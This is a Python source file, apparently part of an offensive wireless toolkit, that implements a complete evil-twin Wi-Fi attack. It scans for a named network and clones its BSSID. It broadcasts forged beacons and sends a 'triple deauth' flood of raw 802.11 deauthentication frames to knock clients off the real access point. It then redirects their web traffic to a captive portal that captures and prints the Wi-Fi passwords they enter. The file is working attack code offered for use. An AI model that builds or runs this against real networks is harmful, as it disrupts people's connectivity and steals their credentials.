import os, sys, time, json, subprocess, threading, re, socket, struct
from pathlib import Path
from typing import Optional, Union, List
from rich.console import Console

_console = Console()
BASE = Path(__file__).parent


class EviltwinCoordinator:
    def __init__(self, iface: str, ssid: Union[str, list[str]], channel: int = 0, bssid: Optional[str] = None):
        self.iface = iface
        self.ssids = [ssid] if isinstance(ssid, str) else ssid
        self.channel = channel
        self.clone_bssid = bssid
        self._running = threading.Event()
        self._eviltwin_proc: Optional[subprocess.Popen] = None
        self._deauth_proc: Optional[subprocess.Popen] = None
        self._captive = None
        self._beacon_sent = 0
        self._deauth_sent = 0
        self._deauth2_sent = 0
        self._deauth_py_sent = 0
        self._detected_clients: List[str] = []
        self._clients_lock = threading.Lock()
        self._real_bssid: Optional[str] = None
        self._real_channel: Optional[int] = None
        self._bridge_iface: Optional[str] = None
        self._monitor_mode = False

    def _enter_monitor_mode(self):
        subprocess.run(["sudo", "ip", "link", "set", self.iface, "down"],
                       capture_output=True, timeout=5)
        subprocess.run(["sudo", "iw", "dev", self.iface, "set", "type", "monitor"],
                       capture_output=True, timeout=5)
        subprocess.run(["sudo", "ip", "link", "set", self.iface, "up"],
                       capture_output=True, timeout=5)
        self._monitor_mode = True
        _console.print("[bold cyan]◈ Monitor mode active[/bold cyan]")

    def _exit_monitor_mode(self):
        if not self._monitor_mode:
            return
        subprocess.run(["sudo", "ip", "link", "set", self.iface, "down"],
                       capture_output=True, timeout=5)
        subprocess.run(["sudo", "iw", "dev", self.iface, "set", "type", "managed"],
                       capture_output=True, timeout=5)
        subprocess.run(["sudo", "ip", "link", "set", self.iface, "up"],
                       capture_output=True, timeout=5)
        self._monitor_mode = False

    def set_captive(self, enable: bool, dhcp_range: Optional[str] = None):
        if enable:
            from hackit.wireless.captive_portal import CaptivePortal
            gw = dhcp_range.split("/")[0] if dhcp_range else "192.168.1.1"
            self._captive = CaptivePortal(self.iface, gateway_ip=gw)
            self._bridge_iface = dhcp_range.split("/")[0] if dhcp_range else "192.168.1.1"

    # ── Auto-detect real AP from SSID ──────────────────────────
    def _scan_for_ssid(self, ssid: str, retries: int = 3) -> tuple[Optional[str], Optional[int]]:
        for attempt in range(retries):
            if attempt > 0:
                _console.print(f"[yellow]  Retry {attempt+1}/{retries}...[/yellow]")
                time.sleep(2)
            try:
                result = subprocess.run(
                    ["iw", "dev", self.iface, "scan", "-u"],
                    capture_output=True, text=True, timeout=15
                )
                output = result.stdout
            except subprocess.TimeoutExpired:
                continue

            current_bssid = None
            best_bssid = None
            best_channel = None
            best_signal = -999

            for line in output.splitlines():
                ls = line.strip()
                if ls.startswith("BSS "):
                    raw = ls.split()[1].upper()
                    paren = raw.find('(')
                    current_bssid = raw[:paren] if paren > 10 else raw
                elif ls.startswith("SSID:") and current_bssid:
                    found_ssid = ls[5:].strip().strip('"')
                    if found_ssid == ssid:
                        best_bssid = current_bssid
                elif ls.startswith("signal:") and best_bssid and current_bssid == best_bssid:
                    try:
                        sig = float(ls.split()[1].split(".")[0])
                        if sig > best_signal:
                            best_signal = sig
                    except:
                        pass
                elif ls.startswith("freq:") and best_bssid and current_bssid == best_bssid:
                    try:
                        freq = int(ls.split()[1])
                        best_channel = self._freq_to_channel(freq)
                    except:
                        pass

            if best_bssid:
                return best_bssid, best_channel or 6
        return None, None

    def _freq_to_channel(self, freq: int) -> int:
        if freq < 2484: return (freq - 2412) // 5 + 1
        if freq < 4500: return 14
        if freq < 5845: return (freq - 5180) // 5 + 36
        return (freq - 5845) // 5 + 149

    # ── Start all attacks ──────────────────────────────────────
    def start(self):
        self._running.set()
        base_ssid = self.ssids[0]

        # 1. Scan before monitor mode (iw scan needs managed mode)
        scan_msg = f"[yellow]◈ Scanning for '{base_ssid}'...[/yellow]"
        if self.clone_bssid and self.channel:
            _console.print(f"[dim]◈ Using provided BSSID/CH, skip scan[/dim]")
        else:
            _console.print(scan_msg)
            detected_bssid, detected_ch = self._scan_for_ssid(base_ssid)
            if detected_bssid:
                self._real_bssid = detected_bssid
                _console.print(f"[bold red]◈ Real AP: {detected_bssid} CH={detected_ch}[/bold red]")
                if detected_ch:
                    self.channel = detected_ch
                    self._real_channel = detected_ch
            else:
                _console.print(f"[yellow]◈ '{base_ssid}' not found (proceeding blind)[/yellow]")

        # 2. Enter monitor mode
        _console.print("[bold yellow]◈ Engaging monitor mode...[/bold yellow]")
        self._enter_monitor_mode()
        time.sleep(1)

        _console.print(f"[bold cyan]◈ Locked on CH {self.channel}[/bold cyan]")
        self._set_channel(self.iface, self.channel)
        self._set_max_txpower()

        if self._captive:
            self._setup_iptables()

        # 3. Launch eviltwin-inject (beacon + deauth + probe)
        self._launch_eviltwin_inject()

        # 4. Triple deauth: C binary (eviltwin built-in) + standalone C + Python raw
        if self._real_bssid:
            _console.print(f"[bold red]◈ TRIPLE DEAUTH → {self._real_bssid} CH {self.channel}[/bold red]")
            self._launch_deauth_inject()
            threading.Thread(target=self._inject_deauth_python, daemon=True).start()

        if self._captive:
            self._captive.set_ssid(base_ssid)
            self._captive.start()
            _console.print("[bold green]◈ Captive portal active[/bold green]")

        _console.print(f"[bold cyan]◈ Broadcasting {len(self.ssids)} SSIDs:[/bold cyan]")
        for s in self.ssids:
            _console.print(f"  [cyan]◇[/cyan] {s}")
        _console.print("[bold green]▸ Waiting for targets...[/bold green]")

        self._status_thread = threading.Thread(target=self._status_loop, daemon=True)
        self._status_thread.start()

    # ── Set channel / TX power ────────────────────────────────
    def _set_channel(self, iface: str, ch: int):
        subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)],
                        capture_output=True, timeout=5)

    def _set_max_txpower(self):
        subprocess.run(["sudo", "iw", "dev", self.iface, "set", "txpower", "fixed", "3000"],
                        capture_output=True, timeout=5)

    # ── iptables ──────────────────────────────────────────────
    def _setup_iptables(self):
        cmds = [
            ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
            ["sudo", "iptables", "-t", "nat", "-F"],
            ["sudo", "iptables", "-F"],
            ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
             "-i", self.iface, "-p", "tcp", "--dport", "80",
             "-j", "REDIRECT", "--to-port", "80"],
            ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
             "-i", self.iface, "-p", "tcp", "--dport", "443",
             "-j", "REDIRECT", "--to-port", "80"],
            ["sudo", "iptables", "-A", "FORWARD",
             "-i", self.iface, "-j", "ACCEPT"],
        ]
        for c in cmds:
            try:
                subprocess.run(c, capture_output=True, timeout=5)
            except:
                pass

    def _cleanup_iptables(self):
        try:
            subprocess.run(["sudo", "iptables", "-t", "nat", "-F"],
                           capture_output=True, timeout=5)
            subprocess.run(["sudo", "iptables", "-F"],
                           capture_output=True, timeout=5)
        except:
            pass

    # ── eviltwin-inject (beacon + deauth + probe) ─────────────
    def _launch_eviltwin_inject(self):
        injector = self._find_binary("eviltwin-inject")
        if not injector:
            _console.print("[red]eviltwin-inject not found, using Python fallback[/red]")
            threading.Thread(target=self._inject_python_raw, daemon=True).start()
            return

        args = [injector, self.iface, self.ssids[0],
                self.clone_bssid or self._real_bssid or "00:11:22:33:44:55",
                str(self.channel)]
        if len(self.ssids) > 1:
            args.append("--multi")
            for s in self.ssids[1:]:
                args.extend(["--ssid", s])
        if self._real_bssid:
            args.extend(["--deauth", "--real-bssid", self._real_bssid])
            args.append("--clone-bssid")
        args.append("--probe")
        args.extend(["--ssid-match", self.ssids[0]])

        self._eviltwin_proc = subprocess.Popen(
            ["sudo"] + args,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
        )
        threading.Thread(target=self._parse_eviltwin_output, daemon=True).start()

    def _parse_eviltwin_output(self):
        if not self._eviltwin_proc or not self._eviltwin_proc.stdout:
            return
        for line in self._eviltwin_proc.stdout:
            if not self._running.is_set():
                break
            ls = line.strip()
            if "beacon sent" in ls:
                try: self._beacon_sent = int(ls.split()[-1])
                except: pass
            elif "deauth sent" in ls:
                try: self._deauth_sent = int(ls.split()[-1])
                except: pass
            elif "client" in ls and "probed" in ls:
                try:
                    mac = ls.split()[2]
                    with self._clients_lock:
                        if mac not in self._detected_clients:
                            self._detected_clients.append(mac)
                            _console.print(f"[bold yellow]  ▸ Client: {mac}[/bold yellow]")
                except: pass
            elif "error" in ls.lower() or "done:" in ls:
                _console.print(f"[dim]{ls}[/dim]")
        self._eviltwin_proc.wait()

    # ── Standalone deauth-inject (double deauth firepower) ────
    def _launch_deauth_inject(self):
        if not self._real_bssid:
            return
        deauth_bin = self._find_binary("deauth-inject")
        if deauth_bin:
            args = [deauth_bin, self.iface, self._real_bssid, "FF:FF:FF:FF:FF:FF"]
            self._deauth_proc = subprocess.Popen(
                ["sudo"] + args,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
            )
            threading.Thread(target=self._parse_deauth_output, daemon=True).start()
        else:
            _console.print("[yellow]deauth-inject binary not found, using Python deauth[/yellow]")
            threading.Thread(target=self._inject_deauth_python, daemon=True).start()

    def _parse_deauth_output(self):
        if not self._deauth_proc or not self._deauth_proc.stdout:
            return
        for line in self._deauth_proc.stdout:
            if not self._running.is_set():
                break
            ls = line.strip()
            if "sent" in ls:
                try: self._deauth2_sent = int(ls.split()[-1])
                except: pass
            elif "error" in ls.lower() or "done:" in ls:
                _console.print(f"[dim]{ls}[/dim]")
        self._deauth_proc.wait()

    # ── Python deauth injector (third deauth source) ──────────
    def _inject_deauth_python(self):
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            s.bind((self.iface, 0))
        except PermissionError:
            return
        bssid = self._mac_bytes(self._real_bssid)
        bcast = b"\xff" * 6
        total = 0
        while self._running.is_set():
            total += self._py_send_deauth(s, bssid, bcast)
            total += self._py_send_deauth(s, bssid, bcast, disassoc=True)
            with self._clients_lock:
                for c in self._detected_clients:
                    cmac = self._mac_bytes(c)
                    total += self._py_send_deauth(s, bssid, cmac)
                    total += self._py_send_deauth(s, bssid, cmac, disassoc=True)
                    total += self._py_send_deauth(s, cmac, bssid)
                    total += self._py_send_deauth(s, cmac, bssid, disassoc=True)
            if total % 200 == 0:
                self._deauth_py_sent = total
        s.close()

    def _py_send_deauth(self, sock, bssid, station, disassoc=False):
        radiotap = bytes([0x00,0x00,0x0C,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00])
        fc = bytes([0xC0,0x00]) if not disassoc else bytes([0xA0,0x00])
        dur = bytes([0x00,0x00])
        seq = bytes([0x00,0x00])
        frame = radiotap + fc + dur + station + bssid + bssid + seq + bytes([3, 0])
        try:
            return 1 if sock.send(frame) > 0 else 0
        except OSError:
            return 0

    # ── Python fallback injector ───────────────────────────────
    def _inject_python_raw(self):
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        try:
            sock.bind((self.iface, 0))
        except PermissionError:
            return
        sock.settimeout(0.1)
        idx, seq = 0, 0
        while self._running.is_set():
            cur = self.ssids[idx % len(self.ssids)]
            idx += 1
            bssid_b = self._mac_bytes(self._real_bssid or "00:11:22:33:44:55")
            frame = self._build_beacon(cur, bssid_b, self.channel, seq)
            seq = (seq + 1) & 0xFFF
            try:
                sock.send(frame)
                self._beacon_sent += 1
            except OSError:
                pass
        sock.close()

    def _mac_bytes(self, mac: str) -> bytes:
        return bytes(int(b,16) for b in mac.split(":"))

    def _build_beacon(self, ssid: str, bssid: bytes, channel: int, seq: int) -> bytes:
        sb = ssid.encode("utf-8", errors="replace")[:32]
        rt = bytes([0x00,0x00,0x0C,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00])
        fc = bytes([0x80,0x00])
        dur = bytes([0x00,0x00])
        da = b"\xff"*6
        sq = struct.pack("<H", (seq<<4)&0xFFFF)
        mgmt = fc+dur+da+bssid+bssid+sq
        ts = struct.pack("<Q", int(time.time()*1000000))
        iv = struct.pack("<H", 100)
        cap = bytes([0x11,0x04])
        stag = bytes([0x00,len(sb)])+sb
        rates = bytes([0x01,0x08,0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24])
        ds = bytes([0x03,0x01,channel])
        erp = bytes([0x2A,0x01,0x00])
        ext = bytes([0x32,0x04,0x30,0x48,0x60,0x6C])
        return rt+mgmt+ts+iv+cap+stag+rates+ds+erp+ext

    # ── Find binary ────────────────────────────────────────────
    def _find_binary(self, name: str) -> Optional[str]:
        candidates = [
            BASE / "c_core" / name,
            Path(f"/usr/local/bin/{name}"),
        ]
        for p in candidates:
            if p.exists():
                return str(p)
        try:
            subprocess.run(["make", "-C", str(BASE/"c_core"), name],
                          capture_output=True, timeout=30)
            p = BASE / "c_core" / name
            if p.exists():
                return str(p)
        except:
            pass
        return None

    # ── Status loop ────────────────────────────────────────────
    SPINNER = ['◐', '◓', '◑', '◒']

    def _status_loop(self):
        tick = 0
        wait_tick = 0
        had_client = False
        while self._running.is_set():
            time.sleep(0.5)
            tick += 1
            sp = self.SPINNER[tick % 4]
            with self._clients_lock:
                n_clients = len(self._detected_clients)
            if n_clients > 0:
                had_client = True
                wait_tick = 0
            else:
                wait_tick += 1

            total_deauth = self._deauth_sent + self._deauth2_sent + self._deauth_py_sent
            parts = [f"◇ {sp}", f"beacon={self._beacon_sent}"]
            if total_deauth > 0:
                parts.append(f"deauth={total_deauth}")
            if had_client:
                parts.append(f"clients={n_clients}")
            else:
                dots = '.' * (wait_tick % 4 + 1)
                parts.append(f"waiting{dots}")
            if self._captive:
                creds = len(self._captive.get_captured_passwords())
                if creds > 0:
                    parts.append(f"creds={creds}")

            line = " | ".join(parts)
            sys.stdout.write(f"\r  \033[K{line}")
            sys.stdout.flush()

            if n_clients > 0 and tick % 2 == 0:
                with self._clients_lock:
                    for mac in self._detected_clients:
                        sys.stdout.write(f"\n  [\033[92m+\033[0m] \033[93m{mac}\033[0m")
                sys.stdout.flush()

            if self._captive and tick % 4 == 0:
                pwds = self._captive.get_captured_passwords()
                if pwds:
                    p = pwds[-1]
                    sys.stdout.write(f"\n  [\033[91m!\033[0m] PWD: {p['password']}")
                    sys.stdout.flush()

    # ── Public API ─────────────────────────────────────────────
    def stop(self):
        self._running.clear()
        for proc in [self._eviltwin_proc, self._deauth_proc]:
            if proc:
                proc.terminate()
                try: proc.wait(timeout=3)
                except: proc.kill()
        if self._captive:
            self._captive.stop()
        self._cleanup_iptables()
        self._exit_monitor_mode()
        sys.stdout.write("\n")
        sys.stdout.flush()

        total_deauth = self._deauth_sent + self._deauth2_sent
        creds = self.get_credentials()
        if creds:
            _console.print(f"\n[bold green]=== CAPTURED ({len(creds)}) ===[/bold green]")
            for c in creds:
                _console.print(f"  [red]{c['password']}[/red] ({c['ssid']}) @ {c['timestamp']}")

        _console.print(f"\n[bold]Summary:[/bold]")
        _console.print(f"  Beacon:   {self._beacon_sent}")
        _console.print(f"  Deauth:   {total_deauth}")
        _console.print(f"  Clients:  {len(self._detected_clients)}")
        _console.print(f"  Creds:    {len(creds)}")
        _console.print(f"  Channel:  {self.channel}")

    def is_alive(self) -> bool:
        return self._running.is_set()

    def status(self) -> str:
        with self._clients_lock:
            n_clients = len(self._detected_clients)
        total_deauth = self._deauth_sent + self._deauth2_sent
        parts = [f"beacon={self._beacon_sent}", f"clients={n_clients}"]
        if total_deauth > 0:
            parts.append(f"deauth={total_deauth}")
        if self._captive:
            parts.append(f"creds={len(self._captive.get_captured_passwords())}")
        return " | ".join(parts)

    def get_credentials(self) -> list[dict]:
        if self._captive:
            return self._captive.get_captured_passwords()
        return []

    def get_clients(self) -> list[str]:
        with self._clients_lock:
            return list(self._detected_clients)
